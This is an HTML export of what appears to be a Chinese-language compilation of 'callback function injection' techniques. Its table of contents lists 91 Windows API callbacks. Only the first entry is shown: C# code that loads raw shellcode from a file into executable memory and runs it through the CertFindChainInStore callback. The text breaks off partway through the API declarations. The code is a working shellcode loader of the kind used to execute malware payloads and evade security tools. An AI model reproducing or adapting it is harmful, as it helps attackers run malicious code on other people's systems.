.output_wrapper table tr{border-width: 1px 0px 0px; border-right-style: initial; border-bottom-style: initial; border-left-style: initial; border-right-color: initial; border-bottom-color: initial; border-left-color: initial; border-image: initial; border-top-style: solid; border-top-color: rgb(204, 204, 204); background-color: white;}

.output_wrapper table tr th,.output_wrapper  table tr td{font-size: 1em; border: 1px solid rgb(204, 204, 204); padding: 0.5em 1em; text-align: left;}

.output_wrapper table tr th{font-weight: bold; background-color: rgb(240, 240, 240);}

.output_wrapper .katex-display{font-size: 1.22em;}

.output_wrapper .katex{padding: 8px 3px;}

.output_wrapper .katex-display > .katex{display: inline-block; text-align: center; padding: 3px;}

.output_wrapper .katex img{display: inline-block; vertical-align: middle;}

.output_wrapper a[href^="#"] sup{vertical-align: super; margin: 0px 2px; padding: 1px 3px; color: rgb(255, 255, 255); background: rgb(102, 102, 102); font-size: 0.7em;}

.output_wrapper .task-list-list{list-style-type: none;}

.output_wrapper .task-list-list.checked{color: rgb(62, 62, 62);}

.output_wrapper .task-list-list.uncheck{color: rgb(191, 193, 191);}

.output_wrapper .task-list-list .icon_uncheck,.output_wrapper  .task-list-list .icon_check{display: inline-block; vertical-align: middle; margin-right: 10px;}

.output_wrapper .task-list-list .icon_check::before{content: "√"; border: 2px solid rgb(62, 62, 62); color: red;}

.output_wrapper .task-list-list .icon_uncheck::before{content: "x"; border: 2px solid rgb(191, 193, 191); color: rgb(191, 193, 191);}

.output_wrapper .task-list-list .icon_check::before,.output_wrapper  .task-list-list .icon_uncheck::before{padding: 2px 8px 2px 5px; border-radius: 5px;}

.output_wrapper .toc{margin-left: 25px;}

.output_wrapper .toc_item{display: block;}

.output_wrapper .toc_left{margin-left: 25px;}
 
</style>  
  <style type="text/css" id="export_setting_css">body { width: 100%; margin: 0px; padding: 0px; background: rgb(81, 154, 178); }
#export_content { margin: 40px 20%; padding: 20px; border: 1px solid rgb(149, 155, 111); background: rgb(255, 255, 255); }</style>  

</head><body><div id="export_content"><div class="output_wrapper" id="output_wrapper_id"><p class="toc" id="tocid_0"><span class="toc_item"><span class="toc_left"><a href="#h1ccertfindchaininstore">1.回调函数注入 (C#) 通过 CertFindChainInStore</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h2ccopyfiletransacted">2.回调函数注入 (C#) 通过 CopyFileTransacted</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h3cdsa_enumcallback">3.回调函数注入 (C#) 通过 DSA_EnumCallback</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h4cencryptedfileraw">4.回调函数注入 (C#) 通过 EncryptedFileRaw</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h5cevtsubscribe_cveeventwrite">5.回调函数注入 (C#) 通过 EvtSubscribe_CVEEventWrite</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h6cmfaddperiodiccallback">6.回调函数注入 (C#) 通过 MFAddPeriodicCallback</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h7cmessageboxindirect">7.回调函数注入 (C#) 通过 MessageBoxIndirect</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h8cnotifyipinterfacechange">8.回调函数注入 (C#) 通过 NotifyIpInterfaceChange</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h9cnotifyroutechange2">9.回调函数注入 (C#) 通过 NotifyRouteChange2</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h10cnotifyteredoportchange">10.回调函数注入 (C#) 通过 NotifyTeredoPortChange</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h11cnotifyunicastipaddresschange">11.回调函数注入 (C#) 通过 NotifyUnicastIpAddressChange</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h12cperfstartproviderex">12.回调函数注入 (C#) 通过 PerfStartProviderEx</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h13cregisterwaitforsingleobject">13.回调函数注入 (C#) 通过 RegisterWaitForSingleObject</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h14csetwaitabletimer">14.回调函数注入 (C#) 通过 SetWaitableTimer</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h15cstackwalk">15.回调函数注入 (C#) 通过 StackWalk</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h16csymregistercallback">16.回调函数注入 (C#) 通过 SymRegisterCallback</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h17cwinhttpsetstatuscallback">17.回调函数注入 (C#) 通过 WinHttpSetStatusCallback</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h18cdeffoldermenu_create2">18.回调函数注入 通过 CDefFolderMenu_Create2</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h19certenumsystemstore">19.回调函数注入 通过 CertEnumSystemStore</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h20certenumsystemstorelocation">20.回调函数注入 通过 CertEnumSystemStoreLocation</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h21certfindchaininstore">21.回调函数注入 通过 CertFindChainInStore</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h22copyfile2">22.回调函数注入 通过 CopyFile2</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h23copyfileex">23.回调函数注入 通过 CopyFileEx</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h24copyfiletransacted">24.回调函数注入 通过 CopyFileTransacted</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h25createthreadpoolwait">25.回调函数注入 通过 CreateThreadPoolWait</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h26createtimerqueuetimer">26.回调函数注入 通过 CreateTimerQueueTimer</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h27createtimerqueuetimer_tech">27.回调函数注入 通过 CreateTimerQueueTimer_Tech</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h28cryptenumoidinfo">28.回调函数注入 通过 CryptEnumOIDInfo</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h29dsa_enumcallback">29.回调函数注入 通过 DSA_EnumCallback</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h30encryptedfileraw">30.回调函数注入 通过 EncryptedFileRaw</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h31enumchildwindows">31.回调函数注入 通过 EnumChildWindows</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h32enumdateformatsa">32.回调函数注入 通过 EnumDateFormatsA</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h33enumdesktopw">33.回调函数注入 通过 EnumDesktopW</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h34enumdesktopwindows">34.回调函数注入 通过 EnumDesktopWindows</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h35enumdirtreew">35.回调函数注入 通过 EnumDirTreeW</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h36enumdisplaymonitors">36.回调函数注入 通过 EnumDisplayMonitors</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h37enumfontfamiliesexw">37.回调函数注入 通过 EnumFontFamiliesExW</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h38enumfontfamiliesw">38.回调函数注入 通过 EnumFontFamiliesW</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h39enumfontsw">39.回调函数注入 通过 EnumFontsW</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h40enumicmprofiles">40.回调函数注入 通过 EnumICMProfiles</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h41enumlanguagegrouplocalesw">41.回调函数注入 通过 EnumLanguageGroupLocalesW</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h42enumobjects">42.回调函数注入 通过 EnumObjects</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h43enumpagefilesw">43.回调函数注入 通过 EnumPageFilesW</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h44enumpropsex">44.回调函数注入 通过 EnumPropsEx</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h45enumpropsw">45.回调函数注入 通过 EnumPropsW</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h46enumpwrschemes">46.回调函数注入 通过 EnumPwrSchemes</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h47enumresourcetypesexw">47.回调函数注入 通过 EnumResourceTypesExW</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h48enumresourcetypesw">48.回调函数注入 通过 EnumResourceTypesW</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h49enumsystemcodepagesa">49.回调函数注入 通过 EnumSystemCodePagesA</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h50enumsystemcodepagesw">50.回调函数注入 通过 EnumSystemCodePagesW</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h51enumsystemgeoid">51.回调函数注入 通过 EnumSystemGeoID</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h52enumsystemlanguagegroupsa">52.回调函数注入 通过 EnumSystemLanguageGroupsA</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h53enumsystemlocales">53.回调函数注入 通过 EnumSystemLocales</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h54enumsystemlocalesa">54.回调函数注入 通过 EnumSystemLocalesA</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h55enumthreadwindows">55.回调函数注入 通过 EnumThreadWindows</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h56enumtimeformatsex">56.回调函数注入 通过 EnumTimeFormatsEx</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h57enumuilanguagesa">57.回调函数注入 通过 EnumUILanguagesA</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h58enumuilanguagesw">58.回调函数注入 通过 EnumUILanguagesW</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h59enumwindowstationsw">59.回调函数注入 通过 EnumWindowStationsW</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h60enumwindows">60.回调函数注入 通过 EnumWindows</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h61enumerateloadedmodules">61.回调函数注入 通过 EnumerateLoadedModules</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h62evtsubscribe_cveeventwrite">62.回调函数注入 通过 EvtSubscribe_CVEEventWrite</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h63fibercontextedit">63.回调函数注入 通过 FiberContextEdit</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h64flsalloc">64.回调函数注入 通过 FlsAlloc</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h65imagegetdigeststream">65.回调函数注入 通过 ImageGetDigestStream</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h66immenuminputcontext">66.回调函数注入 通过 ImmEnumInputContext</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h67initonceexecuteonce">67.回调函数注入 通过 InitOnceExecuteOnce</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h68ldrenumerateloadedmodules">68.回调函数注入 通过 LdrEnumerateLoadedModules</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h69ldrpcallinitroutine">69.回调函数注入 通过 LdrpCallInitRoutine</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h70mfaddperiodiccallback">70.回调函数注入 通过 MFAddPeriodicCallback</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h71messageboxindirect">71.回调函数注入 通过 MessageBoxIndirect</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h72minidumpwritedump">72.回调函数注入 通过 MiniDumpWriteDump</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h73notifyipinterfacechange">73.回调函数注入 通过 NotifyIpInterfaceChange</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h74notifyroutechange2">74.回调函数注入 通过 NotifyRouteChange2</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h75notifyteredoportchange">75.回调函数注入 通过 NotifyTeredoPortChange</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h76notifyunicastipaddresschange">76.回调函数注入 通过 NotifyUnicastIpAddressChange</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h77perfstartproviderex">77.回调函数注入 通过 PerfStartProviderEx</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h78registerwaitforsingleobject">78.回调函数注入 通过 RegisterWaitForSingleObject</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h79rtluserfiberstart">79.回调函数注入 通过 RtlUserFiberStart</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h80shcreatethreadwithhandle">80.回调函数注入 通过 SHCreateThreadWithHandle</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h81settimer">81.回调函数注入 通过 SetTimer</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h82setwaitabletimer">82.回调函数注入 通过 SetWaitableTimer</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h83setupcommitfilequeuew">83.回调函数注入 通过 SetupCommitFileQueueW</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h84stackwalk">84.回调函数注入 通过 StackWalk</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h85symenumprocesses">85.回调函数注入 通过 SymEnumProcesses</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h86symfindfileinpath">86.回调函数注入 通过 SymFindFileInPath</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h87symregistercallback">87.回调函数注入 通过 SymRegisterCallback</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h88sysenumsourcefiles">88.回调函数注入 通过 SysEnumSourceFiles</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h89taskdialogindirect">89.回调函数注入 通过 TaskDialogIndirect</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h90verifierenumerateresource">90.回调函数注入 通过 VerifierEnumerateResource</a></span></span><span class="toc_item"><span class="toc_left"><a href="#h91winhttpsetstatus">91.回调函数注入 通过 WinHttpSetStatus</a></span></span></p>
<h1 id="h1ccertfindchaininstore"><span>1.回调函数注入 (C#) 通过 CertFindChainInStore</span></h1>
<pre><code class="hljs cs"><span class="linenum hljs-number">  1</span><span class="hljs-comment">//&nbsp;Wra7h\FlavorTown</span><br><span class="linenum hljs-number">  2</span><span class="hljs-comment">//&nbsp;Compile:&nbsp;Visual&nbsp;Studio&nbsp;2022&nbsp;&amp;&nbsp;.NET&nbsp;Fx&nbsp;3.5+</span><br><span class="linenum hljs-number">  3</span><br><span class="linenum hljs-number">  4</span><span class="hljs-keyword">using</span>&nbsp;System;<br><span class="linenum hljs-number">  5</span><span class="hljs-keyword">using</span>&nbsp;System.Diagnostics;<br><span class="linenum hljs-number">  6</span><span class="hljs-keyword">using</span>&nbsp;System.Runtime.InteropServices;<br><span class="linenum hljs-number">  7</span><br><span class="linenum hljs-number">  8</span><span class="hljs-keyword">namespace</span>&nbsp;<span class="hljs-title">CertFindChainInStore</span><br><span class="linenum hljs-number">  9</span>{<br><span class="linenum hljs-number"> 10</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">internal</span>&nbsp;<span class="hljs-keyword">class</span>&nbsp;<span class="hljs-title">Program</span><br><span class="linenum hljs-number"> 11</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number"> 12</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">void</span>&nbsp;<span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[]&nbsp;args</span>)<br><span class="linenum hljs-number"> 13</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>{<br><span class="linenum hljs-number"> 14</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(args.Length&nbsp;&lt;&nbsp;<span class="hljs-number">1</span>)<br><span class="linenum hljs-number"> 15</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number"> 16</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"\nNo&nbsp;shellcode&nbsp;specified."</span>);<br><span class="linenum hljs-number"> 17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"Example&nbsp;Usage:&nbsp;CertFindChainInStore.exe&nbsp;C:\\Path\\To\\Raw\\Shellcode.bin\n"</span>);<br><span class="linenum hljs-number"> 18</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.Environment.Exit(<span class="hljs-number">1</span>);<br><span class="linenum hljs-number"> 19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number"> 20</span><br><span class="linenum hljs-number"> 21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">byte</span>[]&nbsp;payload&nbsp;=&nbsp;System.IO.File.ReadAllBytes(args[<span class="hljs-number">0</span>]);<br><span class="linenum hljs-number"> 22</span><br><span class="linenum hljs-number"> 23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<br><span class="linenum hljs-number"> 24</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr.Zero,<br><span class="linenum hljs-number"> 25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(<span class="hljs-keyword">uint</span>)payload.Length,<br><span class="linenum hljs-number"> 26</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x1000</span>&nbsp;<span class="hljs-comment">/*COMMIT*/</span>,<br><span class="linenum hljs-number"> 27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x40</span>&nbsp;<span class="hljs-comment">/*RWX*/</span>);<br><span class="linenum hljs-number"> 28</span><br><span class="linenum hljs-number"> 29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Marshal.Copy(payload,&nbsp;<span class="hljs-number">0</span>,&nbsp;hAlloc,&nbsp;payload.Length);<br><span class="linenum hljs-number"> 30</span><br><span class="linenum hljs-number"> 31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;oldProtect;<br><span class="linenum hljs-number"> 32</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualProtectEx(<br><span class="linenum hljs-number"> 33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process.GetCurrentProcess().Handle,<br><span class="linenum hljs-number"> 34</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hAlloc,<br><span class="linenum hljs-number"> 35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload.Length,<br><span class="linenum hljs-number"> 36</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x20</span>,&nbsp;<span class="hljs-comment">//RX</span><br><span class="linenum hljs-number"> 37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;oldProtect);<br><span class="linenum hljs-number"> 38</span><br><span class="linenum hljs-number"> 39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hCertStore&nbsp;=&nbsp;CertOpenSystemStore(<span class="hljs-number">0</span>,&nbsp;<span class="hljs-string">"MY"</span>);<br><span class="linenum hljs-number"> 40</span><br><span class="linenum hljs-number"> 41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CERT_CHAIN_FIND_BY_ISSUER_PARA&nbsp;sCCFIP&nbsp;=&nbsp;<span class="hljs-keyword">new</span>&nbsp;CERT_CHAIN_FIND_BY_ISSUER_PARA();<br><span class="linenum hljs-number"> 42</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sCCFIP.pfnFindCallback&nbsp;=&nbsp;hAlloc;<br><span class="linenum hljs-number"> 43</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sCCFIP.cbSize&nbsp;=&nbsp;(<span class="hljs-keyword">uint</span>)Marshal.SizeOf(sCCFIP);<br><span class="linenum hljs-number"> 44</span><br><span class="linenum hljs-number"> 45</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CertFindChainInStore(<br><span class="linenum hljs-number"> 46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hCertStore,<br><span class="linenum hljs-number"> 47</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x1</span>,<br><span class="linenum hljs-number"> 48</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0</span>,<br><span class="linenum hljs-number"> 49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">1</span>,<br><span class="linenum hljs-number"> 50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">ref</span>&nbsp;sCCFIP,<br><span class="linenum hljs-number"> 51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr.Zero);<br><span class="linenum hljs-number"> 52</span><br><span class="linenum hljs-number"> 53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//Cleanup</span><br><span class="linenum hljs-number"> 54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CertCloseStore(hCertStore,&nbsp;<span class="hljs-number">0</span>);<br><span class="linenum hljs-number"> 55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number"> 56</span><br><span class="linenum hljs-number"> 57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32"</span>)</span>]<br><span class="linenum hljs-number"> 58</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params"><br><span class="linenum hljs-number"> 59</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number"> 60</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwSize,<br><span class="linenum hljs-number"> 61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flAllocationType,<br><span class="linenum hljs-number"> 62</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flProtect</span>)</span>;<br><span class="linenum hljs-number"> 63</span><br><span class="linenum hljs-number"> 64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number"> 65</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">VirtualProtectEx</span>(<span class="hljs-params"><br><span class="linenum hljs-number"> 66</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hProcess,<br><span class="linenum hljs-number"> 67</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number"> 68</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">int</span>&nbsp;dwSize,<br><span class="linenum hljs-number"> 69</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flNewProtect,<br><span class="linenum hljs-number"> 70</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;lpflOldProtect</span>)</span>;<br><span class="linenum hljs-number"> 71</span><br><span class="linenum hljs-number"> 72</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"crypt32.dll"</span>,&nbsp;CharSet&nbsp;=&nbsp;CharSet.Unicode)</span>]<br><span class="linenum hljs-number"> 73</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">CertOpenSystemStore</span>(<span class="hljs-params"><br><span class="linenum hljs-number"> 